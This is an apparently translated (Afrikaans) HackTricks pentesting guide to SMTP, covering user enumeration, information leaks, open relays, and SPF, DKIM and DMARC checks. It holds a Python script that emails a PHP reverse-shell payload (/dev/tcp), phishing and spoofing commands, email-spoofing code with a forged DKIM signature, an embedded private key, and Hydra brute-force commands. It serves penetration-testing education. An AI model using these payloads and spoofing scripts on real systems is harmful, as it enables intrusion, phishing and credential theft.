# 25,465,587 - Pentesting SMTP/s

{{#include ../../banners/hacktricks-training.md}}

## **Basiese Inligting**

Die **Simple Mail Transfer Protocol (SMTP)** is 'n protokol wat binne die TCP/IP-suite gebruik word vir die **stuur en ontvang van e-pos**. Vanweë sy beperkings in die opstel van boodskappe aan die ontvanger se kant, word SMTP dikwels saam met **POP3 of IMAP** gebruik. Hierdie bykomende protokolle stel gebruikers in staat om boodskappe op 'n bediener se posbus te stoor en om dit periodiek af te laai.

In praktyk is dit algemeen dat **e-posprogramme** **SMTP gebruik om e-posse te stuur**, terwyl **POP3 of IMAP gebruik word om dit te ontvang**. Op stelsels wat op Unix gebaseer is, is **sendmail** die SMTP-bediener wat die meeste gebruik word vir e-posdoeleindes. Die kommersiële pakket bekend as Sendmail sluit 'n POP3-bediener in. Verder bied **Microsoft Exchange** 'n SMTP-bediener en die opsie om POP3-ondersteuning in te sluit.

**Standaard poort:** 25,465(ssl),587(ssl)
```
PORT   STATE SERVICE REASON  VERSION
25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959
```
### EMAIL Headers

As jy die geleentheid het om die **slagoffer 'n e-pos te laat stuur** (via kontakvorm van die webblad byvoorbeeld), doen dit omdat **jy oor die interne topologie** van die slagoffer kan leer deur die koppe van die e-pos te sien.

Jy kan ook 'n e-pos van 'n SMTP-bediener kry deur te probeer **'n e-pos na daardie bediener te stuur na 'n nie-bestaande adres** (omdat die bediener 'n NDN-e-pos aan die aanvaller sal stuur). Maar, maak seker dat jy die e-pos van 'n toegelate adres stuur (kontroleer die SPF-beleid) en dat jy NDN-boodskappe kan ontvang.

Jy moet ook probeer om **verskillende inhoud te stuur omdat jy meer interessante inligting** op die koppe kan vind soos: `X-Virus-Scanned: by av.domain.com`\
Jy moet die EICAR-toetslêer stuur.\
Die opsporing van die **AV** mag jou in staat stel om **bekende kwesbaarhede** te benut.

## Basic actions

### **Banner Grabbing/Basic connection**

**SMTP:**
```bash
nc -vn <IP> 25
```
**SMTPS**:
```bash
openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```
### Vind MX bedieners van 'n organisasie
```bash
dig +short mx google.com
```
### Opname
```bash
nmap -p25 --script smtp-commands 10.10.10.10
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### NTLM Auth - Inligting openbaarmaking

As die bediener NTLM-authentisering (Windows) ondersteun, kan jy sensitiewe inligting (weergawe) verkry. Meer inligting [**hier**](https://medium.com/@m8r0wn/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666).
```bash
root@kali: telnet example.com 587
220 example.com SMTP Server Banner
>> HELO
250 example.com Hello [x.x.x.x]
>> AUTH NTLM 334
NTLM supported
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```
Of **automate** dit met **nmap** plugin `smtp-ntlm-info.nse`

### Interne bediener naam - Inligtingsontsluiting

Sommige SMTP bedieners voltooi outomaties 'n sender se adres wanneer die opdrag "MAIL FROM" gegee word sonder 'n volledige adres, wat sy interne naam openbaar:
```
220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at  Wed, 15 Sep 2021 12:13:28 +0200
EHLO all
250-somedomain.com Hello [x.x.x.x]
250-TURN
250-SIZE 52428800
250-ETRN
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-8bitmime
250-BINARYMIME
250-CHUNKING
250-VRFY
250 OK
MAIL FROM: me
250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK
```
### Sniffing

Kyk of jy 'n wagwoord uit die pakkette na poort 25 kan snuffel

### [Auth bruteforce](../../generic-hacking/brute-force.md#smtp)

## Gebruikersnaam Bruteforce Enumerasie

**Outentisering is nie altyd nodig nie**

### RCPT TO
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
MAIL FROM:example@domain.com
250 2.1.0 example@domain.com... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```
### VRFY
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
VRFY root
250 Super-User root@myhost
VRFY blah
550 blah... User unknown
```
### EXPN
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 ed.williams@myhost
EXPN sshd
250 2.1.5 sshd privsep sshd@myhost
```
### Outomatiese gereedskap
```
Metasploit: auxiliary/scanner/smtp/smtp_enum
smtp-user-enum: smtp-user-enum -M <MODE> -u <USER> -t <IP>
Nmap: nmap --script smtp-enum-users <IP>
```
## DSN Verslae

**Afleweringsstatus Kennisgewing Verslae**: As jy 'n **e-pos** na 'n organisasie stuur na 'n **ongeldige adres**, sal die organisasie jou in kennis stel dat die adres ongeldig was deur 'n **pos terug na jou** te stuur. **Koptekste** van die teruggestuurde e-pos sal **bevat** moontlike **sensitiewe inligting** (soos IP-adres van die posdienste wat met die verslae geinteraksie het of anti-virus sagteware inligting).

## [Opdragte](smtp-commands.md)

### Stuur 'n E-pos vanaf linux konsole
```bash
sendEmail -t to@domain.com -f from@attacker.com -s <ip smtp> -u "Important subject" -a /tmp/malware.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
- First line must be received within 60 seconds.
- End manual input with a CTRL-D on its own line.

<phishing message>
```

```bash
swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
```
### Stuur 'n E-pos met Python

<details>

<summary>Python kode hier</summary>
```python
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "127.0.0.1"
lport = 443
rhost = "192.168.1.1"
rport = 25 # 489,587

# create message object instance
msg = MIMEMultipart()

# setup the parameters of the message
password = ""
msg['From'] = "attacker@local"
msg['To'] = "victim@local"
msg['Subject'] = "This is not a drill!"

# payload
message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
print("[-]Connection Error")
exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
```
</details>

## SMTP Smuggling

SMTP Smuggling kwesbaarheid het toegelaat om al die SMTP beskermings te omseil (kyk die volgende afdeling vir meer inligting oor beskermings). Vir meer inligting oor SMTP Smuggling kyk:

{{#ref}}
smtp-smuggling.md
{{#endref}}

## Mail Spoofing Teenmaatreëls

Organisasies word verhinder om ongeoorloofde e-pos namens hulle te laat stuur deur **SPF**, **DKIM**, en **DMARC** te gebruik weens die maklikheid van die vervalsing van SMTP-boodskappe.

'n **volledige gids tot hierdie teenmaatreëls** is beskikbaar by [https://seanthegeek.net/459/demystifying-dmarc/](https://seanthegeek.net/459/demystifying-dmarc/).

### SPF

> [!CAUTION]
> SPF [is "verouderd" in 2014](https://aws.amazon.com/premiumsupport/knowledge-center/route53-spf-record/). Dit beteken dat in plaas daarvan om 'n **TXT rekord** in `_spf.domain.com` te skep, jy dit in `domain.com` skep met die **dieselfde sintaksis**.\
> Boonop, om vorige spf rekords te hergebruik, is dit redelik algemeen om iets soos `"v=spf1 include:_spf.google.com ~all"` te vind.

**Sender Policy Framework** (SPF) is 'n mechanisme wat Mail Transfer Agents (MTAs) in staat stel om te verifieer of 'n gasheer wat 'n e-pos stuur, geautoriseer is deur 'n lys van geautoriseerde e-pos bedieners wat deur die organisasies gedefinieer is, te vra. Hierdie lys, wat IP adresse/reekse, domeine, en ander entiteite **geautoriseer om e-pos namens 'n domeinnaam te stuur**, sluit verskeie "**Mechanismes**" in die SPF rekord in.

#### Mechanismes

Van [Wikipedia](https://en.wikipedia.org/wiki/Sender_Policy_Framework):

| Mechanisme | Beskrywing                                                                                                                                                                                                                                                                                                                         |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ALL       | Pas altyd toe; gebruik vir 'n standaard resultaat soos `-all` vir alle IP's wat nie deur vorige meganismes pas nie.                                                                                                                                                                                                                                  |
| A         | As die domeinnaam 'n adres rekord (A of AAAA) het wat na die sender se adres opgelos kan word, sal dit pas.                                                                                                                                                                                                                   |
| IP4       | As die sender in 'n gegewe IPv4 adres reeks is, pas.                                                                                                                                                                                                                                                                              |
| IP6       | As die sender in 'n gegewe IPv6 adres reeks is, pas.                                                                                                                                                                                                                                                                              |
| MX        | As die domeinnaam 'n MX rekord het wat na die sender se adres oplos, sal dit pas (d.w.s. die e-pos kom van een van die domein se inkomende e-pos bedieners).                                                                                                                                                                          |
| PTR       | As die domeinnaam (PTR rekord) vir die kliënt se adres in die gegewe domein is en daardie domeinnaam na die kliënt se adres oplos (voorwaarts-bevestigde omgekeerde DNS), pas. Hierdie mechanisme word ontmoedig en moet vermy word, indien moontlik.                                                                                     |
| EXISTS    | As die gegewe domeinnaam na enige adres oplos, pas (maak nie saak na watter adres dit oplos nie). Dit word selde gebruik. Saam met die SPF makro-taal bied dit meer komplekse pasvorms soos DNSBL-vrae.                                                                                                                           |
| INCLUDE   | Verwys na die beleid van 'n ander domein. As daardie domein se beleid slaag, slaag hierdie mechanisme. As die ingeslote beleid egter misluk, gaan verwerking voort. Om heeltemal aan 'n ander domein se beleid te delegeer, moet die herlei uitbreiding gebruik word.                                                                                     |
| REDIRECT  | <p> 'n Herlei is 'n aanduiding na 'n ander domeinnaam wat 'n SPF beleid huisves, dit stel verskeie domeine in staat om dieselfde SPF beleid te deel. Dit is nuttig wanneer daar met 'n groot aantal domeine gewerk word wat dieselfde e-pos infrastruktuur deel.</p><p>Die SPF beleid van die domein aangedui in die herlei Mechanisme sal gebruik word.</p> |

Dit is ook moontlik om **Kwalifiseerders** te identifiseer wat aandui **wat gedoen moet word as 'n mechanisme pas**. Standaard word die **kwalifiseerder "+"** gebruik (so as enige mechanisme pas, beteken dit dit is toegelaat).\
Jy sal gewoonlik **aan die einde van elke SPF beleid** iets soos: **\~all** of **-all** opgemerk. Dit word gebruik om aan te dui dat **as die sender nie aan enige SPF beleid voldoen nie, jy die e-pos as onbetroubaar (\~) of verwerp (-) moet merk.**

#### Kwalifiseerders

Elke mechanisme binne die beleid kan voorafgegaan word deur een van vier kwalifiseerders om die beoogde resultaat te definieer:

- **`+`**: Kom ooreen met 'n PASS resultaat. Standaard neem meganismes aan dat hierdie kwalifiseerder, wat `+mx` gelyk is aan `mx`.
- **`?`**: Verteenwoordig 'n NEUTRALE resultaat, wat soortgelyk behandel word aan NONE (geen spesifieke beleid).
- **`~`**: Dui SOFTFAIL aan, wat as 'n middelgrond tussen NEUTRAAL en FAIL dien. E-posse wat aan hierdie resultaat voldoen, word gewoonlik aanvaar maar ooreenkomstig gemerk.
- **`-`**: Dui FAIL aan, wat suggereer dat die e-pos heeltemal verwerp moet word.

In die komende voorbeeld word die **SPF beleid van google.com** geïllustreer. Let op die insluiting van SPF beleide van verskillende domeine binne die eerste SPF beleid:
```shell-session
dig txt google.com | grep spf
google.com.             235     IN      TXT     "v=spf1 include:_spf.google.com ~all"

dig txt _spf.google.com | grep spf
; <<>> DiG 9.11.3-1ubuntu1.7-Ubuntu <<>> txt _spf.google.com
;_spf.google.com.               IN      TXT
_spf.google.com.        235     IN      TXT     "v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all"

dig txt _netblocks.google.com | grep spf
_netblocks.google.com.  1606    IN      TXT     "v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all"

dig txt _netblocks2.google.com | grep spf
_netblocks2.google.com. 1908    IN      TXT     "v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all"

dig txt _netblocks3.google.com | grep spf
_netblocks3.google.com. 1903    IN      TXT     "v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all"
```
Tradisioneel was dit moontlik om enige domeinnaam te spoof wat nie 'n korrekte/enige SPF rekord gehad het nie. **Tans**, as **e-pos** van 'n **domein sonder 'n geldige SPF rekord** kom, gaan dit waarskynlik **automaties verwerp/merk as onbetroubaar**.

Om die SPF van 'n domein te kontroleer, kan jy aanlyn gereedskap soos: [https://www.kitterman.com/spf/validate.html](https://www.kitterman.com/spf/validate.html)

### DKIM (DomainKeys Identified Mail)

DKIM word gebruik om uitgaande e-posse te teken, wat hul validasie deur eksterne Mail Transfer Agents (MTAs) moontlik maak deur die domein se publieke sleutel van DNS te verkry. Hierdie publieke sleutel is geleë in 'n domein se TXT rekord. Om toegang tot hierdie sleutel te verkry, moet 'n mens beide die selektor en die domeinnaam weet.

Byvoorbeeld, om die sleutel aan te vra, is die domeinnaam en selektor noodsaaklik. Hierdie kan in die e-poskop `DKIM-Signature` gevind word, bv. `d=gmail.com;s=20120113`.

'n Opdrag om hierdie inligting te verkry, kan soos volg lyk:
```bash
dig 20120113._domainkey.gmail.com TXT | grep p=
# This command would return something like:
20120113._domainkey.gmail.com. 280 IN   TXT    "k=rsa\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3
```
### DMARC (Domein-gebaseerde Boodskapoutentisering, Verslagdoening & Nakoming)

DMARC verbeter e-pos sekuriteit deur op SPF en DKIM protokolle te bou. Dit skets beleide wat posbedieners lei in die hantering van e-posse van 'n spesifieke domein, insluitend hoe om met outentiseringsfoute om te gaan en waar om verslae oor e-posverwerkingsaksies te stuur.

**Om die DMARC rekord te verkry, moet jy die subdomein \_dmarc navraag doen**
```bash
# Reject
dig _dmarc.facebook.com txt | grep DMARC
_dmarc.facebook.com.	3600	IN	TXT	"v=DMARC1; p=reject; rua=mailto:a@dmarc.facebookmail.com; ruf=mailto:fb-dmarc@datafeeds.phishlabs.com; pct=100"

# Quarantine
dig _dmarc.google.com txt | grep DMARC
_dmarc.google.com.	300	IN	TXT	"v=DMARC1; p=quarantine; rua=mailto:mailauth-reports@google.com"

# None
dig _dmarc.bing.com txt | grep DMARC
_dmarc.bing.com.	3600	IN	TXT	"v=DMARC1; p=none; pct=100; rua=mailto:BingEmailDMARC@microsoft.com;"
```
#### DMARC-tags

| Tag Naam | Doel                                         | Voorbeeld                       |
| -------- | -------------------------------------------- | ------------------------------- |
| v        | Protokol weergawe                            | v=DMARC1                        |
| pct      | Persentasie van boodskappe wat aan filtrering onderwerp word | pct=20                          |
| ruf      | Verslag URI vir forensiese verslae         | ruf=mailto:authfail@example.com |
| rua      | Verslag URI van aggregaatverslae            | rua=mailto:aggrep@example.com   |
| p        | Beleid vir organisatoriese domein           | p=quarantine                    |
| sp       | Beleid vir subdomeine van die OD            | sp=reject                       |
| adkim    | Uitlijning modus vir DKIM                    | adkim=s                         |
| aspf     | Uitlijning modus vir SPF                     | aspf=r                          |

### **Wat van Subdomeine?**

**Van** [**hier**](https://serverfault.com/questions/322949/do-spf-records-for-primary-domain-apply-to-subdomains)**.**\
Jy moet aparte SPF-rekords hê vir elke subdomein waarvan jy e-pos wil stuur.\
Die volgende is oorspronklik op openspf.org gepos, wat eens 'n uitstekende hulpbron vir hierdie soort dinge was.

> Die Demon Vraag: Wat van subdomeine?
>
> As ek e-pos van pielovers.demon.co.uk ontvang, en daar is geen SPF-data vir pielovers nie, moet ek dan een vlak teruggaan en SPF vir demon.co.uk toets? Nee. Elke subdomein by Demon is 'n ander kliënt, en elke kliënt mag hul eie beleid hê. Dit sou nie sin maak dat Demon's beleid op al sy kliënte standaard van toepassing is nie; as Demon dit wil doen, kan dit SPF-rekords vir elke subdomein opstel.
>
> So die advies aan SPF-uitgewers is die volgende: jy moet 'n SPF-rekord vir elke subdomein of gasheernaam wat 'n A of MX-rekord het, byvoeg.
>
> Webwerwe met wildcard A of MX-rekords moet ook 'n wildcard SPF-rekord hê, van die vorm: \* IN TXT "v=spf1 -all"

Dit maak sin - 'n subdomein mag baie goed in 'n ander geografiese ligging wees en 'n baie ander SPF-definisie hê.

### **Open Relay**

Wanneer e-posse gestuur word, is dit van kardinale belang om te verseker dat hulle nie as spam gemerk word nie. Dit word dikwels bereik deur die gebruik van 'n **relay-server wat deur die ontvanger vertrou word**. 'n Algemene uitdaging is egter dat administrateurs dalk nie ten volle bewus is van watter **IP-reekse veilig is om toe te laat** nie. Hierdie gebrek aan begrip kan lei tot foute in die opstelling van die SMTP-server, 'n risiko wat gereeld in sekuriteitsassesseringe geïdentifiseer word.

'n Oplossing wat sommige administrateurs gebruik om e-posafleweringsprobleme te vermy, veral rakende kommunikasie met potensiële of lopende kliënte, is om **verbindinge van enige IP-adres toe te laat**. Dit word gedoen deur die SMTP-server se `mynetworks` parameter te konfigureer om alle IP-adresse te aanvaar, soos hieronder getoon:
```bash
mynetworks = 0.0.0.0/0
```
Om te kontroleer of 'n e-posbediener 'n oop relay is (wat beteken dat dit e-pos van enige eksterne bron kan deurstuur), word die `nmap`-instrument algemeen gebruik. Dit sluit 'n spesifieke skrip in wat ontwerp is om dit te toets. Die opdrag om 'n gedetailleerde skandering op 'n bediener (byvoorbeeld, met IP 10.10.10.10) op poort 25 met behulp van `nmap` uit te voer, is:
```bash
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### **Gereedskap**

- [**https://github.com/serain/mailspoof**](https://github.com/serain/mailspoof) **Kontroleer vir SPF en DMARC miskonfigurasies**
- [**https://pypi.org/project/checkdmarc/**](https://pypi.org/project/checkdmarc/) **Kry outomaties SPF en DMARC konfigurasies**

### Stuur Spoof E-pos

- [**https://www.mailsploit.com/index**](https://www.mailsploit.com/index)
- [**http://www.anonymailer.net/**](http://www.anonymailer.net)
- [**https://emkei.cz/**](https://emkei.cz/)

**Of jy kan 'n gereedskap gebruik:**

- [**https://github.com/magichk/magicspoofing**](https://github.com/magichk/magicspoofing)
```bash
# This will send a test email from test@victim.com to destination@gmail.com
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
# But you can also modify more options of the email
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
```
> [!WARNING]
> As jy enige **fout kry met die dkim python lib** wat die sleutel ontleed, voel vry om hierdie een te gebruik.\
> **NOTE**: Dit is net 'n vuil oplossing om vinnige kontrole te doen in gevalle waar die openssl private sleutel **nie deur dkim ontleed kan word** nie.
>
> ```
> -----BEGIN RSA PRIVATE KEY-----
> MIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt
> spr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO
> pkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB
> AoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1
> koxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR
> fgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq
> 1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j
> ZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc
> GNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf
> 422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI
> Ms2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do
> zRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP
> K9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ==
> -----END RSA PRIVATE KEY-----
> ```

**Of jy kan dit handmatig doen:**

{{#tabs}}
{{#tab name="PHP"}}

<pre class="language-php"><code class="lang-php"><strong># Dit sal 'n ongetekende boodskap stuur
</strong><strong>mail("your_email@gmail.com", "Toets Onderwerp!", "hey! Dit is 'n toets", "From: administrator@victim.com");
</strong></code></pre>

{{#endtab}}

{{#tab name="Python"}}
```python
# Code from https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py

import os
import dkim #pip3 install dkimpy
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# Set params
destination="destination@gmail.com"
sender="administrator@victim.com"
subject="Test"
message_html="""
<html>
<body>
<h3>This is a test, not a scam</h3>
<br />
</body>
</html>
"""
sender_domain=sender.split("@")[1]

# Prepare postfix
os.system("sudo sed -ri 's/(myhostname) = (.*)/\\1 = "+sender_domain+"/g' /etc/postfix/main.cf")
os.system("systemctl restart postfix")

# Generate DKIM keys
dkim_private_key_path="dkimprivatekey.pem"
os.system(f"openssl genrsa -out {dkim_private_key_path} 1024 2> /dev/null")
with open(dkim_private_key_path) as fh:
dkim_private_key = fh.read()

# Generate email
msg = MIMEMultipart("alternative")
msg.attach(MIMEText(message_html, "html"))
msg["To"] = destination
msg["From"] = sender
msg["Subject"] = subject
headers = [b"To", b"From", b"Subject"]
msg_data = msg.as_bytes()

# Sign email with dkim
## The receiver won't be able to check it, but the email will appear as signed (and therefore, more trusted)
dkim_selector="s1"
sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers)
msg["DKIM-Signature"] = sig[len("DKIM-Signature: ") :].decode()
msg_data = msg.as_bytes()

# Use local postfix relay to send email
smtp="127.0.0.1"
s = smtplib.SMTP(smtp)
s.sendmail(sender, [destination], msg_data)
```
{{#endtab}}
{{#endtabs}}

### **Meer inligting**

**Vind meer inligting oor hierdie beskermings in** [**https://seanthegeek.net/459/demystifying-dmarc/**](https://seanthegeek.net/459/demystifying-dmarc/)

### **Ander phishing-aanwysers**

- Domein se ouderdom
- Skakels wat na IP-adresse wys
- Skakel manipulasietegnieke
- Verdagte (ongewone) aanhangsels
- Gebroke e-posinhoud
- Waardes wat gebruik word wat verskil van die e-poskoppe
- Bestaans van 'n geldige en vertroude SSL-sertifikaat
- Indiening van die bladsy aan webinhoudfiltering webwerwe

## Eksfiltrasie deur SMTP

**As jy data via SMTP kan stuur** [**lees dit**](../../generic-hacking/exfiltration.md#smtp)**.**

## Konfigurasie lêer

### Postfix

Gewoonlik, as dit geïnstalleer is, bevat `/etc/postfix/master.cf` **scripts om uit te voer** wanneer 'n nuwe e-pos byvoorbeeld deur 'n gebruiker ontvang word. Byvoorbeeld, die lyn `flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient}` beteken dat `/etc/postfix/filtering` uitgevoer sal word as 'n nuwe e-pos deur die gebruiker mark ontvang word.

Ander konfigurasie lêers:
```
sendmail.cf
submit.cf
```
## Verwysings

- [https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/](https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/)
- [https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/](https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/)

## HackTricks Outomatiese Opdragte
```
Protocol_Name: SMTP    #Protocol Abbreviation if there is one.
Port_Number:  25,465,587     #Comma separated if there is more than one.
Protocol_Description: Simple Mail Transfer Protocol          #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMTP
Note: |
SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.

https://book.hacktricks.xyz/pentesting/pentesting-smtp

Entry_2:
Name: Banner Grab
Description: Grab SMTP Banner
Command: nc -vn {IP} 25

Entry_3:
Name: SMTP Vuln Scan
Description: SMTP Vuln Scan With Nmap
Command: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}

Entry_4:
Name: SMTP User Enum
Description: Enumerate uses with smtp-user-enum
Command: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP}

Entry_5:
Name: SMTPS Connect
Description: Attempt to connect to SMTPS two different ways
Command: openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587

Entry_6:
Name: Find MX Servers
Description: Find MX servers of an organization
Command: dig +short mx {Domain_Name}

Entry_7:
Name: Hydra Brute Force
Description: Need Nothing
Command: hydra -P {Big_Passwordlist} {IP} smtp -V

Entry_8:
Name: consolesless mfs enumeration
Description: SMTP enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit'

```
{{#include ../../banners/hacktricks-training.md}}
